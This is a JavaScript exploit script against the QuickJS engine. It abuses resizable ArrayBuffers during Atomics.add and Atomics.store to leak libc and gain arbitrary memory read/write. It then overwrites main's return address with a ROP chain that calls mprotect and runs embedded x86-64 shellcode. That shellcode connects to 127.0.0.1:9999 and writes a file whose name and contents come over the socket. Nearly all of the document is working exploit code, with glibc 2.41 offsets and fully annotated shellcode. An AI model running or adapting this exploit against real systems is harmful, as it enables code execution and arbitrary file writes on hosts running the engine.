// QuickJS Atomics RAB connectback exploit v3
// Based on prior-1 approach with larger backing buffers

'use strict';

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

// Shellcode - connectback: connect to 127.0.0.1:9999, receive filename+content, write file
//
// Disassembly (x86-64, Intel syntax):
//
// === socket(AF_INET, SOCK_STREAM, 0) ===
//   0: xor    edx,edx              ; protocol = 0
//   2: mov    esi,0x1              ; type = SOCK_STREAM (1)
//   7: mov    edi,0x2              ; domain = AF_INET (2)
//   c: mov    eax,0x29             ; syscall 41 = socket
//  11: syscall
//  13: mov    r12d,eax             ; save sockfd in r12
//
// === Setup sockaddr_in on stack ===
//  16: sub    rsp,0x10             ; allocate 16 bytes for sockaddr_in
//  1a: mov    DWORD PTR [rsp],0xf270002    ; sin_family=AF_INET, sin_port=9999
//  21: mov    DWORD PTR [rsp+0x4],0x100007f ; sin_addr = 127.0.0.1
//  29: xor    eax,eax
//  2b: mov    QWORD PTR [rsp+0x8],rax      ; zero padding
//
// === connect(sockfd, &addr, 16) ===
//  30: mov    edx,0x10             ; addrlen = 16
//  35: lea    rsi,[rsp]            ; addr = &sockaddr_in
//  39: mov    edi,r12d             ; sockfd
//  3c: mov    eax,0x2a             ; syscall 42 = connect
//  41: syscall
//
// === Allocate buffer space ===
//  43: sub    rsp,0x1130           ; 4400 bytes for filename + content buffers
//
// === read(sockfd, &fnlen, 4) - read filename length ===
//  4a: mov    edx,0x4              ; count = 4
//  4f: lea    rsi,[rsp]            ; buf = rsp
//  53: mov    edi,r12d             ; sockfd
//  56: xor    eax,eax              ; syscall 0 = read
//  58: syscall
//  5a: mov    r13d,DWORD PTR [rsp] ; r13 = filename_len
//
// === read(sockfd, filename, fnlen) ===
//  5e: mov    edx,r13d             ; count = filename_len
//  61: lea    rsi,[rsp+0x8]        ; buf = rsp+8 (filename buffer)
//  66: mov    edi,r12d             ; sockfd
//  69: xor    eax,eax              ; syscall 0 = read
//  6b: syscall
//
// === Null-terminate filename ===
//  6d: lea    rax,[rsp+0x8]
//  72: add    rax,r13              ; rax = &filename[fnlen]
//  75: mov    BYTE PTR [rax],0x0   ; filename[fnlen] = '\0'
//
// === read(sockfd, &contentlen, 4) - read content length ===
//  78: mov    edx,0x4              ; count = 4
//  7d: lea    rsi,[rsp]            ; buf = rsp
//  81: mov    edi,r12d             ; sockfd
//  84: xor    eax,eax              ; syscall 0 = read
//  86: syscall
//  88: mov    r14d,DWORD PTR [rsp] ; r14 = content_len
//
// === read(sockfd, content, contentlen) ===
//  8c: mov    edx,r14d             ; count = content_len
//  8f: lea    rsi,[rsp+0x108]      ; buf = rsp+0x108 (content buffer)
//  97: mov    edi,r12d             ; sockfd
//  9a: xor    eax,eax              ; syscall 0 = read
//  9c: syscall
//
// === close(sockfd) ===
//  9e: mov    edi,r12d             ; sockfd
//  a1: mov    eax,0x3              ; syscall 3 = close
//  a6: syscall
//
// === open(filename, O_WRONLY|O_CREAT|O_TRUNC, 0644) ===
//  a8: mov    edx,0x1a4            ; mode = 0644
//  ad: mov    esi,0x241            ; flags = O_WRONLY|O_CREAT|O_TRUNC
//  b2: lea    rdi,[rsp+0x8]        ; filename
//  b7: mov    eax,0x2              ; syscall 2 = open
//  bc: syscall
//  be: mov    r15d,eax             ; save fd in r15
//
// === write(fd, content, content_len) ===
//  c1: mov    edx,r14d             ; count = content_len
//  c4: lea    rsi,[rsp+0x108]      ; buf = content
//  cc: mov    edi,r15d             ; fd
//  cf: mov    eax,0x1              ; syscall 1 = write
//  d4: syscall
//
// === close(fd) ===
//  d6: mov    edi,r15d             ; fd
//  d9: mov    eax,0x3              ; syscall 3 = close
//  de: syscall
//
// === exit(0) ===
//  e0: xor    edi,edi              ; status = 0
//  e2: mov    eax,0x3c             ; syscall 60 = exit
//  e7: syscall
//
const SHELLCODE_HEX = "31d2be01000000bf02000000b8290000000f054189c44883ec10c704240200270fc74424047f00000131c04889442408ba10000000488d34244489e7b82a0000000f054881ec30110000ba04000000488d34244489e731c00f05448b2c244489ea488d7424084489e731c00f05488d4424084c01e8c60000ba04000000488d34244489e731c00f05448b34244489f2488db424080100004489e731c00f054489e7b8030000000f05baa4010000be41020000488d7c2408b8020000000f054189c74489f2488db424080100004489ffb8010000000f054489ffb8030000000f0531ffb83c0000000f05";

function hexToBytes(hex) {
    let bytes = [];
    for (let i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

// Offsets for glibc 2.41
const OFF_UNSORTED_BIN = 0x1e7b20n;
const OFF_ENVIRON = 0x1eee28n;
const OFF_MAIN_RET = 0x29ca8n;
const OFF_POP_RDI = 0x2a145n;
const OFF_POP_RSI = 0x2baa9n;
const OFF_POP_RDX_ZERO_POP_RBX_RBP = 0xa97c6n;
const OFF_MPROTECT = 0x10d620n;
const OFF_RW_PAGE = 0x1e7000n;

// -------------------- libc pointer leak --------------------
function leak_libc_ptr() {
    const L1 = 0x3000;
    const L2 = 0x20;
    let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
    let ta = new BigInt64Array(rab);
    let evil = { valueOf() { rab.resize(L2); return 0n; } };
    return u64(Atomics.add(ta, 6, evil));
}

// -------------------- arbitrary u64 view --------------------
function make_arb_u64_view(base_addr, backing_bytes) {
    let backing = new ArrayBuffer(backing_bytes);
    let victim;

    const L1 = 0x70;
    const L2 = 0x20;
    let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
    let ta = new BigInt64Array(rab);

    let evil = {
        valueOf() {
            rab.resize(L2);
            victim = new BigUint64Array(backing);
            return base_addr;
        }
    };

    Atomics.store(ta, 13, evil);
    return { backing, victim, base: base_addr };
}

// -------------------- Main exploit --------------------
function pwn() {
    // Step 1: Leak libc
    let leak = leak_libc_ptr();
    let libcBase = leak - OFF_UNSORTED_BIN;

    // Step 2: Get environ -> stack pointer
    let libcView = make_arb_u64_view(libcBase, 0x600000);
    let envPtr = u64(libcView.victim[Number(OFF_ENVIRON >> 3n)]);

    // Step 3: Map stack window ending at environ
    const stackScan = 0x400000;
    let stackBase = (envPtr - BigInt(stackScan)) & ~7n;
    let stackView = make_arb_u64_view(stackBase, stackScan);

    // Step 4: Find main's return address
    let mainRetValue = libcBase + OFF_MAIN_RET;
    let ret_i = -1;
    const n = stackScan >> 3;

    // Scan from high addresses down (return addr at highest stack address)
    for (let i = n - 4; i >= 0; i--) {
        if (stackView.victim[i] === mainRetValue) {
            ret_i = i;
            break;
        }
    }

    if (ret_i < 0) {
        return;
    }

    // Step 5: Write shellcode to RW page
    let shellcodeAddr = libcBase + OFF_RW_PAGE + 0x500n;
    let rwPageAddr = libcBase + OFF_RW_PAGE;

    // Create view for shellcode write
    let scView = make_arb_u64_view(shellcodeAddr, 0x200);
    let scBytes = hexToBytes(SHELLCODE_HEX);

    for (let i = 0; i < scBytes.length; i += 8) {
        let val = 0n;
        for (let j = 0; j < 8 && (i + j) < scBytes.length; j++) {
            val |= BigInt(scBytes[i + j]) << BigInt(j * 8);
        }
        scView.victim[i >> 3] = val;
    }

    // Step 6: Write ROP chain
    let ropChain = [
        libcBase + OFF_POP_RDI,
        rwPageAddr,
        libcBase + OFF_POP_RSI,
        0x1000n,
        libcBase + OFF_POP_RDX_ZERO_POP_RBX_RBP,
        7n,
        0n,
        0n,
        libcBase + OFF_MPROTECT,
        shellcodeAddr
    ];

    for (let i = 0; i < ropChain.length; i++) {
        stackView.victim[ret_i + i] = ropChain[i];
    }
}

pwn();
